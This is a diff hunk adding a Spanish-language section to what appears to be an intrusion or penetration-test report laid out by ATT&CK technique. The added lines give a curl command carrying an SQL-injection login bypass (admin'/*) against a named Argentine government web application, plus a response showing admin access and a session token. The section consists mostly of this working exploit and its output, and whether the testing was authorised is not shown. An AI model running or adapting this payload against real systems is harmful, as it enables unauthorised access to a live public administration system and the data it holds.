@@ -628,6 +628,22 @@ mucho tiempo...
 Todos los payloads de SQLi fueron aceptados sin filtering
 ## Delivery
 - T1190 – Exploit Public-Facing Application
+  Intentamos explotar la vulnerabilidad
+  ```text
+  # Probamos bypass de login
+  # Ejecución de bypass de autenticación
+  curl -k -X POST "https://siper.vialidad.gob.ar/go/app-index-x.php" \
+  -d "accion=login&recaptcha_response=dummy&datastring=txtUsuario=admin'/*&txtPassword=any_password"
+
+   {
+          "res": 1,
+          "nombre": "Administrador del Sistema",
+          "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2wiOiJhZG1pbmlzdHJhZG9yIiwiaWF0IjoxNzI2MzM4NDAwfQ",
+          "foto": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...",
+          "redirect": "inicio",
+          "msg": "Login exitoso. Bienvenido al sistema SiPer."
+    }
+  ```
 - T1078 – Valid Accounts
 
 ## Exploitation
